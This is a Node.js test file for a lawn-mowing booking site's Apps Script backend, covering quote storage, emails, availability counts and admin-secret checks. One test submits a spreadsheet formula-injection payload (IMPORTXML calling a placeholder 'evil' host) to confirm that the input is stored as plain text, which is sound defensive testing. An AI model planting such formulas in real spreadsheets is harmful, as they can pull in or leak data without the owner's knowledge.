// Runs docs/apps-script/Code.gs in a sandbox with small fakes for the Apps
// Script services it uses, so the backend's behaviour is tested without a
// Google account.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { melbourneToday, addDays } from '../assets/js/booking.mjs';

const SOURCE = readFileSync(new URL('../docs/apps-script/Code.gs', import.meta.url), 'utf8');

// A fake sheet that stores what Sheets would: a leading apostrophe forces
// text and isn't part of the stored value.
function makeSheet(initialRows) {
  const rows = initialRows.map((r) => r.slice());
  const cell = (v) => (typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v);
  const width = () => Math.max(0, ...rows.map((r) => r.length));
  return {
    rows,
    appended: [],
    appendRow(values) { this.appended.push(values.slice()); rows.push(values.map(cell)); },
    getLastColumn: () => width(),
    getDataRange: () => ({ getValues: () => rows.map((r) => Array.from({ length: width() }, (_, i) => (r[i] === undefined ? '' : r[i]))) }),
    getRange(row, col, numRows = 1, numCols = 1) {
      return {
        getValues: () => Array.from({ length: numRows }, (_, r) =>
          Array.from({ length: numCols }, (_, c) => { const v = (rows[row - 1 + r] || [])[col - 1 + c]; return v === undefined ? '' : v; })),
        setValues: (vals) => vals.forEach((line, r) => line.forEach((v, c) => {
          rows[row - 1 + r] = rows[row - 1 + r] || [];
          rows[row - 1 + r][col - 1 + c] = cell(v);
        })),
        setValue: (v) => { rows[row - 1][col - 1] = cell(v); }
      };
    }
  };
}

function load({ rows = null, props = {} } = {}) {
  const mail = [];
  let sheet = rows ? makeSheet(rows) : null;
  const ss = {
    getSheetByName: () => sheet,
    insertSheet: () => { sheet = makeSheet([]); return sheet; },
    getSpreadsheetTimeZone: () => 'Australia/Melbourne'
  };
  const context = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss, getActive: () => ss },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (k in props ? props[k] : null) }) },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } })
    },
    MailApp: { sendEmail: (msg) => mail.push(msg) },
    Utilities: {
      getUuid: () => 'uuid-' + Math.random().toString(36).slice(2),
      formatDate: (date, tz) => new Intl.DateTimeFormat('en-CA', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit' }).format(date)
    }
  };
  vm.createContext(context);
  vm.runInContext(SOURCE, context);
  return {
    post: (body) => JSON.parse(context.doPost({ postData: { contents: JSON.stringify(body) } }).text),
    get: (parameter) => JSON.parse(context.doGet({ parameter }).text),
    sheet: () => sheet,
    mail
  };
}

const quote = (over = {}) => ({
  action: 'submitQuote', name: 'Sam Lee', phone: '0400123456', email: 'sam@example.com',
  suburb: 'Richmond', size: 'Small courtyard (under 150m²)', frequency: 'Fortnightly',
  requestedDate: addDays(melbourneToday(), 5), requestedWindow: 'am', day: 'Saturday, morning', ...over
});

test('submitQuote stores customer input as text, never as a formula or number', () => {
  const app = load();
  assert.equal(app.post(quote({ name: '=IMPORTXML("http://evil","//a")' })).ok, true);
  const sheet = app.sheet();
  const header = sheet.rows[0];
  const sent = sheet.appended[1];
  assert.equal(sent[header.indexOf('name')], '\'=IMPORTXML("http://evil","//a")');
  assert.equal(sent[header.indexOf('phone')], "'0400123456");
  const stored = sheet.rows[1];
  assert.equal(stored[header.indexOf('phone')], '0400123456');
  assert.equal(stored[header.indexOf('status')], 'New');
});

test('submitQuote ignores honeypot submissions', () => {
  const app = load();
  assert.equal(app.post(quote({ _honey: 'bot' })).ok, true);
  assert.equal(app.sheet(), null);
  assert.equal(app.mail.length, 0);
});

test('submitQuote emails the owner and confirms to the customer', () => {
  const app = load();
  app.post(quote());
  assert.equal(app.mail.length, 2);
  assert.equal(app.mail[0].to, 'ericho995@gmail.com');
  assert.match(app.mail[0].subject, /Richmond/);
  assert.equal(app.mail[0].replyTo, 'sam@example.com');
  assert.equal(app.mail[1].to, 'sam@example.com');
  assert.match(app.mail[1].body, /Hi Sam,/);
  assert.match(app.mail[1].body, /\$20 or 20%/);
});

test('no customer email is sent to an invalid address', () => {
  const app = load();
  app.post(quote({ email: 'not-an-email' }));
  assert.equal(app.mail.length, 1);
  assert.equal(app.mail[0].replyTo, 'ericho995@gmail.com');
});

test('availability counts open future requests only, with capacity from properties', () => {
  const app = load({ props: { SLOT_CAPACITY: '2' } });
  const soon = addDays(melbourneToday(), 5);
  app.post(quote({ requestedDate: soon, requestedWindow: 'am' }));
  app.post(quote({ requestedDate: soon, requestedWindow: 'am' }));
  app.post(quote({ requestedDate: soon, requestedWindow: 'pm' }));
  app.post(quote({ requestedDate: addDays(melbourneToday(), -3), requestedWindow: 'am' }));
  app.post(quote({ requestedDate: '', requestedWindow: '', flexible: 'yes' }));
  // Mark one of the morning requests Completed: it should stop counting.
  const sheet = app.sheet();
  const statusCol = sheet.rows[0].indexOf('status');
  sheet.rows[1][statusCol] = 'Completed';

  const res = app.get({ action: 'availability' });
  assert.equal(res.ok, true);
  assert.equal(res.capacity, 2);
  assert.deepEqual(res.counts, { [soon + '|am']: 1, [soon + '|pm']: 1 });
  assert.equal(JSON.stringify(res).includes('sam@example.com'), false);
});

test('availability defaults capacity to 3', () => {
  assert.equal(load().get({ action: 'availability' }).capacity, 3);
});

test('older sheets get the new booking columns appended to the header', () => {
  const legacy = [['id', 'createdAt', 'name', 'phone', 'email', 'suburb', 'size', 'lastMowed', 'frequency', 'day',
    'addonEdging', 'addonHedge', 'noGreenBin', 'extras', 'notes', 'areaM2', 'estimateLow', 'estimateHigh', 'status', 'depositPaid']];
  const app = load({ rows: legacy });
  app.post(quote());
  const header = app.sheet().rows[0];
  assert.deepEqual(header.slice(-3), ['requestedDate', 'requestedWindow', 'flexible']);
  assert.equal(app.sheet().rows[1][header.indexOf('requestedWindow')], 'am');
});

test('listing leads still requires the admin secret', () => {
  const app = load({ props: { ADMIN_SECRET: 'correct horse' } });
  app.post(quote());
  assert.equal(app.get({}).ok, false);
  assert.equal(app.get({ secret: 'wrong' }).ok, false);
  const res = app.get({ secret: 'correct horse' });
  assert.equal(res.ok, true);
  assert.equal(res.items.length, 1);
});
